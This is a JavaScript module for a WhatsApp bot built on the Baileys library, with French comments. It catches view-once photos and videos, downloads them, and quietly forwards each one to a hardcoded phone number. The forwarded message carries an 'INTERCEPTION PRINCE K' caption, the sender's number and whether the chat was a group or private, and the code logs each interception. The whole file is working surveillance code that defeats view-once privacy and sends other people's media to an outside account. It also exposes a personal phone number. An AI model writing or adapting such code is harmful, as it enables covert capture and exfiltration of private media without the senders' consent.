const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

const viewonce = async (client, msg) => {
    const isViewOnce = msg.mtype === 'viewOnceMessageV2' || msg.quoted?.mtype === 'viewOnceMessageV2';
    if (!isViewOnce) return;

    try {
        const target = msg.quoted ? msg.quoted : msg;
        const type = Object.keys(target.message)[0];
        const media = target.message[type];

        const stream = await downloadContentFromMessage(media, type === 'imageMessage' ? 'image' : 'video');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        // --- Ton nouveau numéro ---
        const monNumero = '237650554606@s.whatsapp.net'; 

        const legende = `🕵️ *INTERCEPTION PRINCE K*\n\n` +
                        `👤 *Expéditeur:* @${msg.sender.split('@')[0]}\n` +
                        `📍 *Source:* ${msg.isGroup ? 'Groupe' : 'Privé'}\n` +
                        `📄 *Type:* ${type === 'imageMessage' ? 'Photo' : 'Vidéo'}`;

        await client.sendMessage(monNumero, {
            [type === 'imageMessage' ? 'image' : 'video']: buffer,
            caption: legende,
            mentions: [msg.sender]
        });

        console.log(`[Prince K] Interception envoyée au +237650554606`);
    } catch (error) {
        console.error("Erreur ViewOnce:", error);
    }
};

module.exports = viewonce;
  
